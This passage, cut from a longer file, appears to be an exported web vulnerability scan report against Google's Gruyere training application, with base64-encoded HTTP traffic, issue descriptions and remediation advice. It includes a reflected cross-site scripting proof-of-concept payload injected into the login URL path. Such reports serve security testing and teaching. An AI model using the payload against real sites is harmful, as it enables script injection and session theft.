leGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDI+R3J1eWVyZTogTG9naW48L2gyPgo8L2Rpdj4KCgoKPGRpdiBjbGFzcz0nY29udGVudCc+Cjxmb3JtIG1ldGhvZD0nZ2V0JyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4nPgo8dGFibGU+PHRyPjx0ZD4KICAgIFVzZXIgbmFtZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1aWQnPgo8L3RkPjwvdHI+PHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CjwvdGQ+PC90cj48dHI+PHRkPjwvdGQ+PHRkIGFsaWduPSdyaWdodCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPgo8L3RkPjwvdHI+PC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>90598235397783552</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>cpu5w&lt;script&gt;alert(1)&lt;/script&gt;keuyj</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW5jcHU1dyUzY3NjcmlwdCUzZWFsZXJ0KDEpJTNjL3NjcmlwdCUzZWtldXlqIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMWE2OTgzZTMzYWEyZjI2M2IxMWIxYjJkNWRmYTFiNTENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0MiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY2NQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL2xvZ2luY3B1NXc8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+a2V1eWo8L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>50936878051447808</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW54NmMxY2VoN2NwIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZTZlM2VmMDg2MGNjNmEyZjkyOTYyN2U5MTdhOGFhODQNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MToxNyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY0MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL2xvZ2lueDZjMWNlaDdjcDwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4241060609150083072</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/logout]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/logout]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClNldC1Db29raWU6IEdSVVlFUkU9OyBwYXRoPS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogN2Y5MmJkY2E3YWE0NDMjZmODYxMGU3MmZhMmI4NmYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyOSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU3OA0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBIb21lPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB